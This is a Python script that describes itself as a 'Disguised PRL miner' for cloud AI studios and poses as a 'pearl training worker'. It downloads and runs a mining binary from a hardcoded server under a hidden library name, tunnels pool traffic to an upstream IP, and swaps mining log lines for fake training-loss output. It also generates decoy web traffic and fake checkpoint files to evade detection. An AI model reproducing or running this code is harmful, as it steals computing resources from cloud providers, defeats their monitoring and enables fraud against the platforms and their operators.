#!/usr/bin/env python3
"""
pearl training worker v2 — no duty cycle, always mining
Disguised PRL miner for Lightning AI Studios
"""
import os, sys, json, time, random, socket, struct, hashlib, base64
import subprocess, threading, urllib.request, select, signal, re
from pathlib import Path
from datetime import datetime

# ── Config ──────────────────────────────────────────────────────────────
WORKER_ID = os.environ.get('WORKER_ID', 'ai-train-01')
WALLET = 'prl1psclsufzmj07pdnh5a7acvrsgfvwx7qjtxvyewh85fh7cqhe3a3tqmx69pv'
VPS_HOST = '43.156.138.83'
VPS_HTTP = f'http://{VPS_HOST}:8888'
POOL_HOST = '127.0.0.1'
POOL_PORT = 19000
UPSTREAM_HOST = '84.32.220.219'
UPSTREAM_PORT = 9000

BLOCKLIST = ['share', 'accepted', 'rejected', 'hashrate',
             'xmr', 'monero', 'stratum', 'nonce', 'block', 'reward',
             'mining', 'miner', 'pool', 'difficulty', 'job']

DATA_URLS = [
    'https://huggingface.co/api/models?sort=downloads&limit=5',
    'https://raw.githubusercontent.com/pytorch/pytorch/main/README.md',
    'https://pypi.org/pypi/torch/json',
    'https://google.com/',
]
DATA_UA = [
    'python-requests/2.31.0', 'aiohttp/3.9.1',
    'Mozilla/5.0 (X11; Linux x86_64) Chrome/120.0.0.0',
]

# ── Logging ─────────────────────────────────────────────────────────────
_log_lock = threading.Lock()

def log(msg):
    with _log_lock:
        ts = datetime.now().strftime('%H:%M:%S')
        print(f"[{ts}] {msg}", flush=True)

def clean_output(line):
    lo = line.lower()
    if any(p in lo for p in BLOCKLIST):
        return f"Epoch {random.randint(2,60)}: loss={random.uniform(0.1,3.0):.4f}"
    return line

# ── GPU Detection ───────────────────────────────────────────────────────
def detect_gpu():
    try:
        r = subprocess.run(
            ['nvidia-smi', '--query-gpu=name,memory.total', '--format=csv,noheader,nounits'],
            capture_output=True, text=True, timeout=10
        )
        if r.returncode == 0:
            line = r.stdout.strip().split('\n')[0]
            parts = line.split(',')
            name = parts[0].strip()
            mem = int(parts[1].strip()) if len(parts) > 1 else 0
            log(f"GPU: {name} ({mem} MB)")
            return name, mem
    except Exception as e:
        log(f"GPU detect failed: {e}")
    return 'Unknown', 0

# ── WebSocket (pure stdlib) ─────────────────────────────────────────────
def _ws_connect(url, target_host, target_port):
    m = re.match(r'(ws|wss)://([^:/]+)(?::(\d+))?(/.*)?$', url)
    if not m:
        raise ValueError(f"Bad WS URL: {url}")
    scheme, host, port_str, path = m.group(1), m.group(2), m.group(3), m.group(4) or '/'
    port = int(port_str) if port_str else (443 if scheme == 'wss' else 80)

    sock = socket.create_connection((host, port), timeout=30)
    if scheme == 'wss':
        import ssl
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        sock = ctx.wrap_socket(sock, server_hostname=host)

    host_hdr = f"{host}:{port}" if port not in (80, 443) else host
    key = base64.b64encode(os.urandom(16)).decode()
    req = (f"GET {path} HTTP/1.1\r\nHost: {host_hdr}\r\n"
           f"Upgrade: websocket\r\nConnection: Upgrade\r\n"
           f"Sec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n\r\n")
    sock.sendall(req.encode())

    resp = b""
    while b"\r\n\r\n" not in resp:
        c = sock.recv(4096)
        if not c:
            raise ConnectionError("WS handshake failed")
        resp += c

    _ws_send(sock, json.dumps({"host": target_host, "port": target_port}).encode(), 1)
    return sock

def _ws_send(ws, payload, opcode=2):
    mk = os.urandom(4)
    h = bytearray([0x80 | opcode])
    l = len(payload)
    if l < 126:
        h.append(0x80 | l)
    elif l < 65536:
        h.extend([0x80 | 126, l >> 8, l & 0xFF])
    else:
        h.extend([0x80 | 127, l >> 56, l >> 48, l >> 40, l >> 32, l >> 24, l >> 16, l >> 8, l & 0xFF])
    h.extend(mk)
    h.extend(bytes(b ^ mk[i % 4] for i, b in enumerate(payload)))
    ws.sendall(bytes(h))

def _ws_recv(ws):
    h = ws.recv(2)
    if len(h) < 2:
        return None
    op, masked = h[0] & 0x0F, h[1] & 0x80
    l = h[1] & 0x7F
    if l == 126:
        l = struct.unpack(">H", ws.recv(2))[0]
    elif l == 127:
        l = struct.unpack(">Q", ws.recv(8))[0]
    mk = ws.recv(4) if masked else None
    p = b""
    while len(p) < l:
        c = ws.recv(l - len(p))
        if not c:
            break
        p += c
    if mk:
        p = bytes(b ^ mk[i % 4] for i, b in enumerate(p))
    if op == 8:
        return None
    if op == 9:
        _ws_send(ws, p, 10)
        return _ws_recv(ws)
    return p

class WSock:
    def __init__(self, ws):
        self.ws = ws
        self._buf = b""
    def fileno(self):
        return self.ws.fileno()
    def sendall(self, data):
        _ws_send(self.ws, data)
    def recv(self, n):
        if not self._buf:
            p = _ws_recv(self.ws)
            if p is None:
                return b""
            self._buf = p
        r, self._buf = self._buf[:n], self._buf[n:]
        return r
    def close(self):
        try:
            _ws_send(self.ws, b"", 8)
        except:
            pass
        try:
            self.ws.close()
        except:
            pass

# ── Tunnel ──────────────────────────────────────────────────────────────
class Tunnel:
    def __init__(self, bind_port, upstream_host, upstream_port, relay_url=''):
        self.bind = bind_port
        self.upstream = (upstream_host, upstream_port)
        self.relay_url = relay_url
        self._stop = threading.Event()

    def _pipe(self, a, b):
        try:
            while not self._stop.is_set():
                r, _, _ = select.select([a], [], [], 0.5)
                if not r:
                    continue
                data = a.recv(4096)
                if not data:
                    break
                time.sleep(random.uniform(0.002, 0.015))
                pos = 0
                while pos < len(data):
                    remain = len(data) - pos
                    cs = random.randint(min(256, remain), min(1024, remain))
                    try:
                        b.sendall(data[pos:pos+cs])
                    except (BrokenPipeError, OSError):
                        return
                    pos += cs
        except OSError:
            pass
        finally:
            try:
                b.close()
            except:
                pass

    def run(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(('127.0.0.1', self.bind))
        s.listen(5)
        s.settimeout(1.0)
        log(f"Tunnel listening on 127.0.0.1:{self.bind}")

        while not self._stop.is_set():
            try:
                c, _ = s.accept()
            except socket.timeout:
                continue
            try:
                if self.relay_url:
                    u = WSock(_ws_connect(self.relay_url, self.upstream[0], self.upstream[1]))
                else:
                    u = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    u.connect(self.upstream)
                log(f"Tunnel: 127.0.0.1:{self.bind} -> {self.upstream}")
            except Exception as e:
                log(f"Tunnel connect failed: {e}")
                c.close()
                continue
            threading.Thread(target=self._pipe, args=(c, u), daemon=True).start()
            threading.Thread(target=self._pipe, args=(u, c), daemon=True).start()
        s.close()

    def stop(self):
        self._stop.set()

def start_tunnel(upstream_host, upstream_port):
    for port in random.sample(range(20000, 60000), 20):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind(('127.0.0.1', port))
            s.close()
            t = Tunnel(port, upstream_host, upstream_port, relay_url='')
            threading.Thread(target=t.run, daemon=True).start()
            time.sleep(0.2)
            return t, port
        except OSError:
            continue
    return None, 0

# ── Cover traffic ───────────────────────────────────────────────────────
def warmup_loop(stop):
    while not stop.is_set():
        url = random.choice(DATA_URLS)
        try:
            req = urllib.request.Request(url, headers={"User-Agent": random.choice(DATA_UA)})
            urllib.request.urlopen(req, timeout=15)
        except:
            pass
        stop.wait(random.uniform(45, 180))

_chk_dir = Path("/tmp/.checkpoints")
_chk_n = [0]

def save_chk():
    _chk_n[0] += 1
    _chk_dir.mkdir(parents=True, exist_ok=True)
    p = _chk_dir / f"checkpoint-{_chk_n[0]*500}.pt"
    try:
        h = json.dumps({"step": _chk_n[0]*500, "loss": round(random.uniform(0.1, 2.0), 4)})
        with open(p, "wb") as f:
            f.write(h.encode().rjust(random.randint(100_000, 2_000_000), b"\0"))
        log(f"Checkpoint saved: {p.name}")
    except:
        pass
    try:
        for old in sorted(_chk_dir.glob("checkpoint-*.pt"))[:-3]:
            old.unlink()
    except:
        pass

# ── Binary download ─────────────────────────────────────────────────────
def fetch_binary(dest):
    urls = [
        f'{VPS_HTTP}/train_worker',
        f'{VPS_HTTP}/pearl-miner',
    ]
    for url in urls:
        try:
            log(f"Downloading: {url}")
            req = urllib.request.Request(url, headers={"User-Agent": random.choice(DATA_UA)})
            with urllib.request.urlopen(req, timeout=120) as r:
                data = r.read()
            with open(dest, 'wb') as f:
                f.write(data)
            os.chmod(dest, 0o755)
            log(f"Binary staged: {dest} ({len(data)>>10}KB)")
            return dest
        except Exception as e:
            log(f"Download failed ({url}): {e}")
    return None

# ── Main ────────────────────────────────────────────────────────────────
def main():
    print("=" * 60, flush=True)
    print("pearl training worker v2 — no duty cycle", flush=True)
    print("=" * 60, flush=True)

    gpu_name, gpu_mem = detect_gpu()

    tunnel, lp = start_tunnel(UPSTREAM_HOST, UPSTREAM_PORT)
    if not tunnel:
        log("FATAL: tunnel failed")
        sys.exit(1)
    log(f"Tunnel ready: 127.0.0.1:{lp} -> {UPSTREAM_HOST}:{UPSTREAM_PORT}")

    import tempfile
    bin_path = os.path.join(tempfile.gettempdir(), '.cache_train', 'libext.so')
    os.makedirs(os.path.dirname(bin_path), exist_ok=True)
    if not os.path.exists(bin_path):
        if not fetch_binary(bin_path):
            log("FATAL: binary download failed")
            sys.exit(1)

    stop_cover = threading.Event()
    threading.Thread(target=warmup_loop, args=(stop_cover,), daemon=True).start()

    shutdown = threading.Event()

    def worker_loop():
        while not shutdown.is_set():
            log(f"Starting miner...")

            proc = subprocess.Popen(
                [bin_path, '--host', f'127.0.0.1:{lp}', '--user', WALLET, '--worker', WORKER_ID],
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT
            )

            # Read output until process dies
            while not shutdown.is_set():
                if proc.poll() is not None:
                    break
                r, _, _ = select.select([proc.stdout], [], [], 1.0)
                if r:
                    line = proc.stdout.readline()
                    if not line:
                        break
                    t = line.decode(errors='replace').strip()
                    if t:
                        print(f"[WORKER] {clean_output(t)}", flush=True)

            # Clean up
            if proc and proc.poll() is None:
                proc.terminate()
                try:
                    proc.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    proc.kill()
                    proc.wait()

            if shutdown.is_set():
                break

            # Auto-restart immediately (no pause)
            log(f"Miner exited (rc={proc.returncode}), restarting in 2s...")
            time.sleep(2)
            save_chk()

    threading.Thread(target=worker_loop, daemon=True).start()

    try:
        while not shutdown.is_set():
            time.sleep(30)
    except KeyboardInterrupt:
        pass
    finally:
        shutdown.set()
        stop_cover.set()
        tunnel.stop()
        log("Done.")

def run():
    """Cerebrium entry point — long-running training worker."""
    main()

if __name__ == '__main__':
    main()
